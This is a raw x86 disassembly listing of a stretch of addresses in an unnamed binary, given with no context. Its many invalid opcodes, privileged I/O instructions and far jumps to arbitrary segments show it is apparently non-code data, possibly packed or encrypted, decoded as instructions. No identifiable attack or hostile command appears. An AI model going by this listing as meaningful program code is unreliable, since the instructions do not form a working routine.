  41471d:	mov    ds:0xcd562550,al
  414722:	shl    BYTE PTR [ebp-0xc],1
  414725:	push   ebp
  414726:	xor    eax,0x97f43409
  41472b:	jmp    0x41477f
  41472d:	xchg   DWORD PTR [ecx+0x2edf70f9],ecx
  414733:	xchg   edx,eax
  414734:	xor    bl,BYTE PTR [edx-0x61]
  414737:	test   al,0x7b
  414739:	push   ecx
  41473a:	xor    BYTE PTR [ecx-0x240f2907],dl
  414740:	mov    esi,es
  414742:	xchg   esp,eax
  414743:	jae    0x4147bf
  414745:	xchg   edi,eax
  414746:	inc    ebx
  414747:	ins    BYTE PTR es:[edi],dx
  414748:	ins    DWORD PTR es:[edi],dx
  414749:	stos   DWORD PTR es:[edi],eax
  41474a:	jge    0x41478b
  41474c:	lahf   
  41474d:	xor    ch,al
  41474f:	iret   
  414750:	hlt    
  414751:	and    eax,0xb2bc940b
  414756:	arpl   WORD PTR [ebx],di
  414758:	adc    DWORD PTR [ebx-0x6e],esp
  41475b:	hlt    
  41475c:	sbb    bl,BYTE PTR [ecx+0x50e3497c]
  414762:	scas   eax,DWORD PTR es:[edi]
  414763:	xor    al,0x7d
  414765:	push   0xffffffb8
  414767:	sbb    eax,0x474e92df
  41476c:	in     al,dx
  41476d:	cmp    al,0x31
  41476f:	sbb    DWORD PTR [edx+0x13],ecx
  414772:	xchg   BYTE PTR [edi],bh
  414774:	push   ds
  414775:	call   0x472f:0x1932f96d
  41477c:	clc    
  41477d:	call   0x33e5:0xc4fb06ad
  414784:	mov    edx,0xaa88db82
  414789:	cmp    eax,0xf169e256
  41478e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41478f:	ja     0x4147aa
  414791:	cmp    eax,DWORD PTR [esi-0x54a4d8e9]
  414797:	test   DWORD PTR [edi],0xdb5bda4a
  41479d:	sub    BYTE PTR [edx],0x7c
  4147a0:	shl    cl,cl
  4147a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147a3:	enter  0xd277,0xc3
  4147a7:	cmp    ah,al
  4147a9:	or     dh,BYTE PTR [ebp+0x62]
  4147ac:	out    dx,eax
  4147ad:	je     0x414760
  4147af:	push   0x5d
  4147b1:	cmp    BYTE PTR [esi+ecx*2-0x2481b4c6],bl
  4147b8:	dec    ebp
  4147b9:	inc    esp
  4147ba:	cmc    
  4147bb:	push   es
  4147bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147bd:	loopne 0x4147f9
  4147bf:	or     DWORD PTR [esi-0x51],esp
  4147c2:	push   ebx
  4147c3:	jecxz  0x4147d7
  4147c5:	pop    ss
  4147c6:	pop    edi
  4147c7:	enter  0x5003,0x7e
  4147cb:	or     ebx,DWORD PTR ds:0xa1e8a6f3
  4147d1:	xlat   BYTE PTR ds:[ebx]
  4147d2:	xor    BYTE PTR [edx+0x6f],0x7
  4147d6:	adc    al,0xb5
  4147d8:	test   BYTE PTR [eax+0x53aadf29],0x6d
  4147df:	dec    edx
  4147e0:	in     al,dx
  4147e1:	cmp    bh,cl
  4147e3:	lea    eax,[edi]
  4147e5:	push   esi
  4147e6:	loope  0x4147b4
  4147e8:	shr    BYTE PTR [esp+esi*4+0x76],0xd8
  4147ed:	push   esi
  4147ee:	popa   
  4147ef:	rol    DWORD PTR [ecx],0xe2
  4147f2:	inc    edi
  4147f3:	jp     0x41478c
  4147f5:	and    esp,DWORD PTR [edx-0x52337d85]
  4147fb:	cmp    al,0x92
  4147fd:	lock into 
  4147ff:	leave  
  414800:	xor    ebx,DWORD PTR [esi+0x5d4e1e10]
  414806:	sub    dl,bl
  414808:	mov    DWORD PTR [eax+edx*1-0x7d],eax
  41480c:	aam    0x81
  41480e:	and    al,0x77
  414810:	call   0x4ba:0x8205b95b
  414817:	fwait
  414818:	xchg   esp,eax
  414819:	loop   0x414873
  41481b:	les    edi,FWORD PTR [ebx]
  41481d:	inc    edx
  41481e:	inc    esi
  41481f:	out    0x22,eax
  414821:	in     eax,0x9e
  414823:	rcl    DWORD PTR [ebp-0x7],0x2b
  414827:	push   esi
  414828:	jne    0x4147f7
  41482a:	jnp    0x4147f4
  41482c:	sub    DWORD PTR [edx-0x80],edx
  41482f:	pop    ebp
  414830:	cs fmulp st(2),st
  414833:	push   ss
  414834:	div    DWORD PTR [ebx+0x51da2ca]
  41483a:	push   ebx
  41483b:	pop    esi
  41483c:	cmp    al,0x11
  41483e:	gs push 0x8704a406
  414844:	push   ecx
  414845:	lods   al,BYTE PTR ds:[esi]
  414846:	mov    edx,eax
  414848:	jl     0x414845
  41484a:	popa   
  41484b:	retf   0x3756
  41484e:	scas   al,BYTE PTR es:[edi]
  41484f:	scas   al,BYTE PTR es:[edi]
  414850:	mov    ebx,0x68910565
  414855:	xor    BYTE PTR [edx],dh
  414857:	in     al,0xdb
  414859:	sti    
  41485a:	sti    
  41485b:	or     DWORD PTR ds:0x4549f355,0xffffff92
  414862:	jecxz  0x4148bc
  414864:	sbb    DWORD PTR [ebx],edi
  414866:	push   cs
  414867:	ret    0x1da9
  41486a:	mov    esi,0xcf17b659
  41486f:	(bad)  
  414870:	lods   al,BYTE PTR ds:[esi]
  414871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414872:	push   esi
  414873:	imul   edi,edx,0x90161493
  414879:	retf   
  41487a:	mov    eax,ds:0x6efcc7f9
  41487f:	inc    esi
  414880:	(bad)  [edi]
  414882:	push   cs
  414883:	mov    es,WORD PTR [ecx-0x78258616]
  414889:	mov    ds,WORD PTR [ebp-0xfe405e5]
  41488f:	test   al,0x92
  414891:	and    ah,cl
  414893:	and    ch,dh
  414895:	cmp    BYTE PTR [esi+0x71],bh
  414898:	jl     0x414830
  41489a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41489b:	loop   0x414906
  41489d:	sub    ch,BYTE PTR [esi-0x1a]
  4148a0:	add    BYTE PTR [edx+0x1db30f6b],0x31
  4148a7:	sar    DWORD PTR [ebp-0x3b5bb7c1],cl
  4148ad:	mov    bh,0xab
  4148af:	push   esp
  4148b0:	xor    ebp,DWORD PTR [ecx+edx*2]
  4148b3:	retf   0x3666
  4148b6:	and    BYTE PTR [esp+esi*2-0x6bd94313],0xe
  4148be:	not    BYTE PTR [edx-0x3]
  4148c1:	fcmovnu st,st(0)
  4148c3:	cli    
  4148c4:	mov    ch,0x9c
  4148c6:	pushf  
  4148c7:	xchg   ecx,eax
  4148c8:	js     0x4148da
  4148ca:	or     al,0xb5
  4148cc:	fucomp st(4)
  4148ce:	aaa    
  4148cf:	xchg   BYTE PTR [ecx],ah
  4148d1:	jno    0x4148a6
  4148d3:	mov    edi,0x34542860
  4148d8:	pop    esi
  4148d9:	jle    0x4148cb
  4148db:	test   DWORD PTR [edx-0x73],ebp
  4148de:	jbe    0x414892
  4148e0:	adc    ch,BYTE PTR [esi-0x68e8d1f9]
  4148e6:	iret   
  4148e7:	dec    eax
  4148e8:	xor    esp,DWORD PTR [ebp+0x29]
  4148eb:	jge    0x4148ae
  4148ed:	test   bl,bh
  4148ef:	daa    
  4148f0:	lock jecxz 0x4148a2
  4148f3:	add    dl,dl
  4148f5:	(bad)  
  4148f6:	cli    
  4148f7:	adc    BYTE PTR ds:0x3d46f5fa,dh
  4148fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148fe:	mov    ebx,0xfe8b7a94
  414903:	cmp    dh,ah
  414905:	xchg   edi,eax
  414906:	fwait
  414907:	xchg   edx,eax
  414908:	sbb    esp,ecx
  41490a:	mov    BYTE PTR ds:0x4cb81b0,al
  414910:	(bad)  
  414911:	cwde   
  414912:	(bad)  
  414913:	(bad)  
  414914:	sub    BYTE PTR ss:[eax+ebx*1+0x8],0x93
  41491a:	mov    esp,0x31fe53e6
  41491f:	push   eax
  414920:	or     eax,0x1d12fd30
  414925:	xor    DWORD PTR [ebp+0x4db3fe6a],eax
  41492b:	pop    edi
  41492c:	mov    bl,0xbb
  41492e:	cs dec ecx
  414930:	mov    ebp,0x413a8701
  414935:	push   edx
  414936:	push   ebx
  414937:	mov    ch,0x2d
  414939:	jb     0x41493c
  41493b:	pushf  
  41493c:	sbb    al,0x78
  41493e:	xchg   eax,ecx
  414940:	retf   
  414941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414942:	fucomip st,st(3)
  414944:	push   ds
  414945:	inc    esi
  414946:	jnp    0x414974
  414948:	and    al,0x12
  41494a:	adc    al,0x3c
  41494c:	test   ebx,ebx
  41494e:	shl    BYTE PTR [ebx],0xbe
  414951:	mov    ss:0x70f840e8,al
  414957:	and    ebp,esi
  414959:	bound  edi,QWORD PTR [ebp+0x7b]
  41495c:	sub    ebp,ecx
  41495e:	arpl   WORD PTR [ecx],si
  414960:	test   BYTE PTR [ebx],bl
  414962:	sbb    eax,0xb82501b3
  414967:	pop    esi
  414968:	daa    
  414969:	mov    edx,0x7f03b233
  41496e:	lds    edi,FWORD PTR [edx-0x5f]
  414971:	push   eax
  414972:	xchg   BYTE PTR [ebp+0x60],ch
  414975:	test   BYTE PTR [ecx+eax*1+0x73750647],0xcd
  41497d:	sub    ah,BYTE PTR [esp+ebx*1+0x360acda9]
  414984:	out    0xe0,eax
  414986:	out    0x48,eax
  414988:	stos   BYTE PTR es:[edi],al
  414989:	mov    WORD PTR [ecx+0x3e3f59c],?
  41498f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414990:	jb     0x4149ab
  414992:	imul   ebp,DWORD PTR [eax],0x39
  414995:	xlat   BYTE PTR ds:[ebx]
  414996:	adc    edi,DWORD PTR [ecx+ecx*8+0x2c702729]
  41499d:	push   esp
  41499e:	pop    ds
  41499f:	pop    es
  4149a0:	in     eax,0x9a
  4149a2:	dec    ebx
  4149a3:	adc    eax,0xc5d53aac
  4149a8:	mov    cl,0x7f
  4149aa:	mov    eax,0x2993e062
  4149af:	xchg   DWORD PTR [ecx-0x59],ebp
  4149b2:	lock hlt 
  4149b4:	and    al,al
  4149b6:	sbb    esi,ebp
  4149b8:	mov    cs,WORD PTR [eax]
  4149ba:	inc    ecx
  4149bb:	pop    edi
  4149bc:	xchg   esi,eax
  4149bd:	jb     0x41495c
  4149bf:	aas    
  4149c0:	pop    eax
  4149c1:	cld    
  4149c2:	out    0x22,eax
  4149c4:	push   ecx
  4149c5:	pusha  
  4149c6:	mov    ebx,DWORD PTR [edi+0x7aef556]
  4149cc:	dec    eax
  4149cd:	xchg   BYTE PTR ds:[edx],ch
  4149d0:	mov    ah,0x32
  4149d2:	push   0xffffff82
  4149d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149d5:	pop    ss
  4149d6:	pop    edx
  4149d7:	dec    esi
  4149d8:	aaa    
  4149d9:	add    al,0x45
  4149db:	ss push 0x66a9abdc
  4149e1:	sub    al,0x34
  4149e3:	and    eax,0xab25e366
  4149e8:	in     al,0xb6
  4149ea:	pop    esi
  4149eb:	sub    DWORD PTR [edx+ebx*1],0x40
  4149ef:	add    eax,0x3edfba90
  4149f4:	hlt    
  4149f5:	push   ecx
  4149f6:	jle    0x414a59
  4149f8:	xchg   esp,eax
  4149f9:	jge    0x4149b2
  4149fb:	mov    ds:0x62280034,eax
  414a00:	enter  0x1e27,0x39
  414a04:	push   edi
  414a05:	jno    0x414a71
  414a07:	call   0x2286:0x96ca00f0
  414a0e:	test   al,0x3e
  414a10:	call   0x96382bf8
  414a15:	test   eax,0x9f504436
  414a1a:	(bad)  
  414a1b:	xchg   bh,cl
  414a1d:	inc    esp
  414a1e:	push   esp
  414a1f:	(bad)  
  414a20:	push   cs
  414a21:	pop    esp
  414a22:	(bad)  
  414a23:	inc    DWORD PTR [esi]
  414a25:	nop
  414a26:	push   eax
  414a27:	fstp   DWORD PTR [esi+0x2cd2841]
  414a2d:	fucom  st(4)
  414a2f:	push   0xa1eced11
  414a34:	dec    esp
  414a35:	push   edi
  414a36:	mov    esi,0xb5f2d361
  414a3b:	fisub  WORD PTR [edx-0x3ce26c0b]
  414a41:	and    BYTE PTR [edx+ecx*1+0x6ee22f84],ch
  414a48:	xor    al,0xf5
  414a4a:	lods   eax,DWORD PTR ds:[esi]
  414a4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a4c:	mov    bh,BYTE PTR [edx-0x4a0d1c8d]
  414a52:	out    0xeb,eax
  414a54:	push   edi
  414a55:	pop    ds
  414a56:	addr16 jne 0x414ac5
  414a59:	rcr    BYTE PTR [esi+0x12696393],1
  414a5f:	add    DWORD PTR [ecx+eax*8],ebx
  414a62:	cdq    
  414a63:	test   bl,bh
  414a65:	xchg   edi,eax
  414a66:	jmp    0x414add
  414a68:	sub    eax,edx
  414a6a:	push   edi
  414a6b:	inc    edi
  414a6c:	push   edx
  414a6d:	std    
  414a6e:	dec    eax
  414a6f:	xchg   esp,eax
  414a70:	rcl    BYTE PTR [ebx],cl
  414a72:	loop   0x414acd
  414a74:	aad    0x53
  414a76:	inc    ebp
  414a77:	pop    ebx
  414a78:	hlt    
  414a79:	lods   eax,DWORD PTR ds:[esi]
  414a7a:	in     al,dx
  414a7b:	jg     0x414ad0
  414a7d:	mov    ecx,0x762e7ce6
  414a82:	mov    al,ds:0x9992928f
  414a87:	cmp    BYTE PTR [edi-0x74],0xeb
  414a8b:	xchg   esp,eax
  414a8c:	inc    edx
  414a8d:	jo     0x414a3a
  414a8f:	fisub  DWORD PTR [eax+0x2d8b21ba]
  414a95:	stos   DWORD PTR es:[edi],eax
  414a96:	cmc    
  414a97:	cs xchg esp,eax
  414a99:	pop    ecx
  414a9a:	in     eax,0x41
  414a9c:	cs push 0xa49e1048
  414aa2:	pop    ebx
  414aa3:	xor    DWORD PTR [ebx],0xa3876acf
  414aa9:	leave  
  414aaa:	cwde   
  414aab:	lods   eax,DWORD PTR ds:[esi]
  414aac:	xchg   BYTE PTR [ebx-0x74329f77],ch
  414ab2:	shr    BYTE PTR [esi-0x6eae4f6],0xf7
  414ab9:	ins    BYTE PTR es:[edi],dx
  414aba:	mov    ecx,0x7d8b3c60
  414abf:	repnz shl esi,0xae
  414ac3:	push   ebp
  414ac4:	iret   
  414ac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ac6:	jae    0x414a48
  414ac8:	cmp    edi,DWORD PTR [edx+0x17cf2a64]
  414ace:	(bad)  
  414acf:	or     ch,bl
  414ad1:	scas   al,BYTE PTR es:[edi]
  414ad2:	cmp    ah,dl
  414ad4:	jl     0x414a5b
  414ad6:	xor    ecx,DWORD PTR [edx-0x52]
  414ad9:	cmp    cl,BYTE PTR cs:[ecx-0x1]
  414add:	mov    cl,0x2
  414adf:	xchg   esp,eax
  414ae0:	jp     0x414b02
  414ae2:	cmp    edx,DWORD PTR [edx]
  414ae4:	or     ebx,DWORD PTR [bp+0x73]
  414ae8:	mov    ch,0x7
  414aea:	fwait
  414aeb:	or     ebp,ebp
  414aed:	cmp    al,0xca
  414aef:	push   edi
  414af0:	into   
  414af1:	push   ebx
  414af2:	aas    
  414af3:	lock sub DWORD PTR [ebp+0x11],edi
  414af7:	add    bh,BYTE PTR [eax*1-0x6bdb8f9b]
  414afe:	mov    eax,0xc7c239b6
  414b03:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  414b05:	jo     0x414aac
  414b07:	stos   DWORD PTR es:[edi],eax
  414b08:	lds    esp,FWORD PTR [ebx-0x2fb07c9a]
  414b0e:	test   BYTE PTR [edx+0x46e86400],dh
  414b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b15:	sahf   
  414b16:	repnz jmp 0x1ec2:0x12a4b6f8
  414b1e:	fldln2 
  414b20:	add    DWORD PTR [edi],edi
  414b22:	jns    0x414aec
  414b24:	xor    al,dh
  414b26:	mov    ch,0x89
  414b28:	in     eax,dx
  414b29:	xchg   esp,eax
  414b2b:	aad    0x25
  414b2d:	lock dec DWORD PTR [ebp-0x26e56ec7]
  414b34:	sbb    DWORD PTR [esi],0xfbc2ee0b
  414b3a:	(bad)  
  414b3b:	rol    DWORD PTR [ebx+ebx*8-0x23],1
  414b3f:	call   0x5f63:0x8e73a022
  414b46:	idiv   BYTE PTR [ebx+0x7e5ad1c2]
  414b4c:	fild   DWORD PTR [eax+0x5bec2ddf]
  414b52:	into   
  414b53:	fcomp  st(6)
  414b55:	jmp    0xd1ba:0xc3de7160
  414b5c:	out    dx,al
  414b5d:	sub    ch,BYTE PTR [eax-0x2e]
  414b60:	sub    bl,BYTE PTR [esi+edx*1-0x110bb0e9]
  414b67:	fwait
  414b68:	add    al,0xfe
  414b6a:	test   DWORD PTR [edi],esi
  414b6c:	xchg   ecx,eax
  414b6d:	adc    ecx,DWORD PTR ds:0x33c66a34
  414b73:	loope  0x414b0d
  414b75:	lea    ecx,[ebx-0x7cbaaefb]
  414b7b:	sbb    esi,DWORD PTR [eax+0xd]
  414b7e:	pop    ecx
  414b7f:	mov    ebx,0x2c7cf1b1
  414b84:	jecxz  0x414b7b
  414b86:	mov    DWORD PTR [eax],edi
  414b88:	dec    esp
  414b89:	mov    ah,ch
  414b8b:	xchg   ebx,eax
  414b8c:	sbb    al,0xb8
  414b8e:	push   eax
  414b8f:	(bad)  
  414b90:	push   edx
  414b91:	adc    eax,0x1c09ec32
  414b96:	jg     0x414ba3
  414b98:	cmc    
  414b99:	xor    BYTE PTR [edx-0x5c69d364],dl
  414b9f:	mov    esi,0xb73a54f0
  414ba4:	xchg   esi,eax
  414ba5:	pop    esi
  414ba6:	jbe    0x414bd1
  414ba8:	sbb    ebx,DWORD PTR [ebp+ebp*1+0x62]
  414bac:	mov    ebx,0xadd9444e
  414bb1:	retf   
  414bb2:	mov    dl,0x77
  414bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bb5:	dec    edi
  414bb6:	mov    dl,BYTE PTR [eax]
  414bb8:	mul    BYTE PTR [edi]
  414bba:	loope  0x414bd2
  414bbc:	pop    ss
  414bbd:	scas   al,BYTE PTR es:[edi]
  414bbe:	dec    ecx
  414bbf:	dec    ebx
  414bc0:	out    dx,al
  414bc1:	aaa    
  414bc2:	lods   al,BYTE PTR ds:[esi]
  414bc3:	xchg   BYTE PTR [ebx-0x42],dl
  414bc6:	fs jmp 0x414bf2
  414bc9:	and    cl,BYTE PTR [ebp+0x5a]
  414bcc:	fidivr WORD PTR [eax]
  414bce:	adc    eax,0x1f3347cb
  414bd3:	fidivr DWORD PTR [ecx+edx*2+0x48873395]
  414bda:	push   ebx
  414bdb:	add    DWORD PTR [edx],esp
  414bdd:	cld    
  414bde:	cmp    al,0x64
  414be0:	fcom   DWORD PTR [ebx]
  414be2:	(bad)  
  414be3:	cld    
  414be4:	mov    dl,BYTE PTR [ecx+eax*2]
  414be7:	sbb    esi,DWORD PTR ds:0xc1f0f0d8
  414bed:	add    eax,0xc3b9dc85
  414bf2:	gs aad 0x5a
  414bf5:	and    eax,0x42672ea9
  414bfa:	shl    BYTE PTR gs:[ecx-0x4a],cl
  414bfe:	xchg   esp,eax
  414bff:	pop    esi
  414c00:	(bad)  
  414c01:	pop    edi
  414c02:	jg     0x414bc9
  414c04:	in     eax,dx
  414c05:	aaa    
  414c06:	lea    ebx,[ebp+0x26]
  414c09:	paddd  mm6,QWORD PTR [edi-0x1f]
  414c0d:	xor    al,0x8c
  414c0f:	in     al,dx
  414c10:	push   0xffffffc2
  414c12:	xor    eax,DWORD PTR [esi-0xa5bcd68]
  414c18:	inc    esi
  414c19:	push   ebp
  414c1a:	pusha  
  414c1b:	adc    dh,bh
  414c1d:	mov    dh,0xf1
  414c1f:	out    0x64,eax
  414c21:	jno    0x414c57
  414c23:	std    
  414c24:	inc    edx
  414c25:	(bad)  
  414c26:	stos   DWORD PTR es:[edi],eax
  414c27:	enter  0xf696,0x0
  414c2b:	push   cs
  414c2c:	pop    esi
  414c2d:	outs   dx,DWORD PTR ds:[esi]
  414c2e:	sub    DWORD PTR [esi],esi
  414c30:	ds daa 
  414c32:	xor    al,0xcc
  414c34:	jno    0x414c3e
  414c36:	xchg   ebx,eax
  414c37:	jg     0x414bd3
  414c39:	lds    esp,FWORD PTR [ebp-0x2f07360]
  414c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c40:	test   al,0xe
  414c42:	sbb    BYTE PTR [edi-0x31a9ff51],cl
  414c48:	inc    edi
  414c49:	jp     0x414c51
  414c4b:	add    eax,0x43e263a5
  414c50:	into   
  414c51:	xchg   ebx,eax
  414c52:	pushf  
  414c53:	xor    ch,bh
  414c55:	clc    
  414c56:	xor    al,0xdf
  414c58:	mov    dh,0xb6
  414c5a:	cmp    esi,DWORD PTR [edx]
  414c5c:	or     eax,0x96a74f7f
  414c61:	or     al,0xda
  414c63:	setg   BYTE PTR [edx+ebp*8+0x4efc3467]
  414c6b:	xchg   esi,eax
  414c6c:	mov    edi,0x8ab7a9b9
  414c71:	mov    ebx,0x885e4842
  414c76:	cmp    eax,0x39d18208
  414c7b:	nop
  414c7c:	dec    ebx
  414c7d:	and    BYTE PTR [ebx],0x7c
  414c80:	mov    ebx,0xc36482b0
  414c85:	lock push esp
  414c87:	mov    BYTE PTR [eax],bl
  414c89:	adc    DWORD PTR [esi-0x11639985],ebx
  414c8f:	sar    BYTE PTR [ebp+0x3e],0xaa
  414c93:	mov    al,bh
  414c95:	add    DWORD PTR [edi],ebx
  414c97:	jg     0x414cca
  414c99:	test   DWORD PTR [esi],esi
  414c9b:	adc    ebx,DWORD PTR [edi]
  414c9d:	shl    DWORD PTR [ebp+0x46b0c3a3],1
  414ca3:	std    
  414ca4:	xor    cl,BYTE PTR [edx]
  414ca6:	clc    
  414ca7:	bound  esp,QWORD PTR [ebx+esi*1+0x34]
  414cab:	mov    BYTE PTR [ecx+0x55],al
  414cae:	or     eax,0xf0a54134
  414cb3:	je     0x414ce0
  414cb5:	mov    DWORD PTR [ecx],ebx
  414cb7:	inc    esp
  414cb8:	(bad)  
  414cb9:	adc    eax,0x17722dfa
  414cbe:	mov    ds:0x3e9b96fe,al
  414cc3:	sub    BYTE PTR [edx],ch
  414cc5:	mov    bl,0x4c
  414cc7:	cld    
  414cc8:	popa   
  414cc9:	ror    DWORD PTR [ebp-0x66],1
  414ccc:	int3   
  414ccd:	pop    eax
  414cce:	and    BYTE PTR [ecx],0xba
  414cd1:	push   edx
  414cd2:	int    0x26
  414cd4:	push   cs
  414cd5:	xchg   DWORD PTR [ebp+0x13],esi
  414cd8:	mov    esp,0xcc5ff62d
  414cdd:	fiadd  DWORD PTR [esi-0x50e82c88]
  414ce3:	call   0x7d9:0xc5c0c08c
  414cea:	xor    esp,DWORD PTR [ebp+0x4f]
  414ced:	or     eax,0xd3df926
  414cf2:	jl     0x414d01
  414cf4:	cdq    
  414cf5:	out    0x10,eax
  414cf7:	sbb    esi,DWORD PTR [edx]
  414cf9:	stos   DWORD PTR es:[edi],eax
  414cfa:	je     0x414cec
  414cfc:	in     eax,0xee
  414cfe:	push   ecx
  414cff:	fwait
  414d00:	pop    ebp
  414d01:	pop    ds
  414d02:	shr    al,0xfd
  414d05:	jne    0x414d47
  414d07:	call   0x4c933ef
  414d0c:	fld    QWORD PTR [ebx]
  414d0e:	ffreep st(3)
  414d10:	jmp    0xf0622cb7
  414d15:	pop    edi
  414d16:	daa    
  414d17:	pop    edi
  414d18:	mov    esi,0xa2b7baa9
  414d1d:	test   DWORD PTR [edx],0xda5477c
  414d23:	xchg   ecx,eax
  414d24:	(bad)  
  414d25:	and    esi,eax
  414d27:	leave  
  414d28:	adc    ecx,ecx
  414d2a:	or     ecx,DWORD PTR [eax]
  414d2c:	cdq    
  414d2d:	loope  0x414d81
  414d2f:	jbe    0x414d12
  414d31:	jb     0x414d11
  414d33:	lods   al,BYTE PTR ds:[si]
  414d35:	es mov ah,0xd5
  414d38:	add    eax,0x8d504310
  414d3d:	push   ds
  414d3e:	(bad)  
  414d3f:	fisttp QWORD PTR [ebp+0x3b]
  414d42:	mov    BYTE PTR [eax+eiz*1],ah
  414d45:	in     al,0x96
  414d47:	sub    al,0xc6
  414d49:	bound  edx,QWORD PTR [edi+0x384f5997]
  414d4f:	sbb    BYTE PTR [esi-0x3f],dh
  414d52:	mov    ch,0x55
  414d54:	hlt    
  414d55:	fidivr WORD PTR [edi-0x70]
  414d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d59:	jle    0x414d65
  414d5b:	fs hlt 
  414d5d:	mov    ecx,0x3f5de52a
  414d62:	add    al,0xe2
  414d64:	imul   esi,DWORD PTR [edi],0x40f715e2
  414d6a:	test   BYTE PTR [eax+0x190e303a],dh
  414d70:	(bad)  
  414d71:	jg     0x414da9
  414d73:	mov    ebx,0xb5482250
  414d78:	sbb    esp,esi
  414d7a:	push   eax
  414d7b:	mov    ah,0xda
  414d7d:	icebp  
  414d7e:	xchg   ebp,eax
  414d7f:	mov    cl,0xd6
  414d81:	in     eax,dx
  414d82:	jecxz  0x414d12
  414d84:	xchg   edi,eax
  414d85:	mov    edx,DWORD PTR [edx-0x24]
  414d88:	cdq    
  414d89:	mov    cl,0xe7
  414d8b:	mov    esp,0xb8578264
  414d90:	frstor [ebx+0x7f]
  414d93:	fldenv [edx+ecx*4]
  414d96:	popf   
  414d97:	and    DWORD PTR [edx-0x22481387],ecx
  414d9d:	(bad)
  414da1:	push   esp
  414da2:	xchg   ebp,eax
  414da3:	(bad)  
  414da4:	cli    
  414da5:	sbb    BYTE PTR [edi-0x38],dh
  414da8:	sahf   
  414da9:	dec    edx
  414daa:	push   edx
  414dab:	cmp    eax,0x260966f2
  414db0:	lods   al,BYTE PTR ds:[esi]
  414db1:	mov    ecx,0x38a17b33
  414db6:	push   edx
  414db7:	xchg   ecx,eax
  414db8:	ret    0xa08e
  414dbb:	popf   
  414dbc:	cld    
  414dbd:	mov    edx,0x5ef4a6a5
  414dc2:	sub    ecx,esi
  414dc4:	popa   
  414dc5:	outs   dx,BYTE PTR ds:[esi]
  414dc6:	fcomp  st(7)
  414dc8:	inc    edi
  414dc9:	es add dl,0x7f
  414dcd:	adc    al,0x18
  414dcf:	pop    ebp
  414dd0:	daa    
  414dd1:	fcomp  QWORD PTR ds:0x6a3ab5af
  414dd7:	outs   dx,DWORD PTR ds:[esi]
  414dd8:	cmp    eax,0x4e45f2af
  414ddd:	rol    ch,1
  414ddf:	outs   dx,BYTE PTR ds:[esi]
  414de0:	or     edi,ebx
  414de2:	mov    dh,BYTE PTR [edi-0xd9eb28a]
  414de8:	pop    edi
  414de9:	outs   dx,BYTE PTR ds:[esi]
  414dea:	outs   dx,BYTE PTR ds:[esi]
  414deb:	pop    esi
  414dec:	xor    ecx,eax
  414dee:	xchg   esi,eax
  414def:	pop    ss
  414df0:	fmul   DWORD PTR ds:0xbec5e4e
  414df6:	jb     0x414e0f
  414df8:	mov    esi,0xe0664b2e
  414dfd:	fidivr DWORD PTR [ebx]
  414dff:	add    esp,DWORD PTR [ecx-0x4a]
  414e02:	sti    
  414e03:	pop    edi
  414e04:	imul   eax,DWORD PTR [ebx-0x15],0x4a
  414e08:	cmp    ah,BYTE PTR [esi+eiz*1]
  414e0b:	test   eax,0xa0082ddc
  414e10:	mov    esi,0xda359be0
  414e15:	pop    esp
  414e16:	sbb    BYTE PTR [eax+0x251a7459],al
  414e1c:	nop
  414e1d:	adc    eax,0xc0d70ebf
  414e22:	arpl   WORD PTR [eax+edi*1+0x35f4ab63],bx
  414e29:	leave  
  414e2a:	jecxz  0x414dda
  414e2c:	arpl   WORD PTR [edi-0x46],si
  414e2f:	and    BYTE PTR [eax-0x3eb0965d],ch
  414e35:	sti    
  414e36:	not    DWORD PTR [esi]
  414e38:	xchg   esp,eax
  414e39:	scas   al,BYTE PTR es:[edi]
  414e3a:	retf   0xd285
  414e3d:	enter  0x4c50,0xce
  414e41:	(bad)  
  414e42:	int3   
  414e43:	outs   dx,BYTE PTR ds:[esi]
  414e44:	in     al,dx
  414e45:	cdq    
  414e46:	arpl   WORD PTR [ebx+0x628dc6bb],bx
  414e4c:	and    ebx,DWORD PTR [esi+0x73934a7f]
  414e52:	xor    dl,BYTE PTR [edi+0x7f]
  414e55:	sti    
  414e56:	es jbe 0x414ec3
  414e59:	dec    ebx
  414e5a:	sub    BYTE PTR [edi],ah
  414e5c:	push   0x55
  414e5e:	(bad)  
  414e5f:	daa    
  414e60:	mov    ebp,0xaf7d6580
  414e65:	mov    ch,0xf6
  414e67:	dec    edx
  414e68:	dec    eax
  414e69:	je     0x414e33
  414e6b:	cmp    DWORD PTR [ebx+0x586dbcd9],esp
  414e71:	pop    ss
  414e72:	push   0xffffffd7
  414e74:	sti    
  414e75:	push   ebx
  414e76:	jbe    0x414ee4
  414e78:	mov    ebx,0xde410d65
  414e7d:	pop    ds
  414e7e:	push   ebp
  414e7f:	sub    eax,0x4aa1c717
  414e84:	pop    esp
  414e85:	in     eax,0x62
  414e87:	sbb    BYTE PTR [eax-0x74d9f80f],bl
  414e8d:	adc    BYTE PTR [esi-0x517b7225],ah
  414e93:	mov    eax,ds:0x11b0d8d2
  414e98:	outs   dx,BYTE PTR ds:[esi]
  414e99:	cld    
  414e9a:	rol    BYTE PTR [ecx-0x5a],1
  414e9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e9e:	push   esp
  414e9f:	mov    dl,0x3a
  414ea1:	push   0x630b08c6
  414ea6:	cmp    eax,0x92509de9
  414eab:	mov    DWORD PTR [edx],edi
  414ead:	std    
  414eae:	jge    0x414e6d
  414eb0:	dec    esi
  414eb1:	adc    DWORD PTR [esi-0x26],0xffffffce
  414eb5:	lods   al,BYTE PTR ds:[esi]
  414eb6:	mov    ds:0x295840d0,al
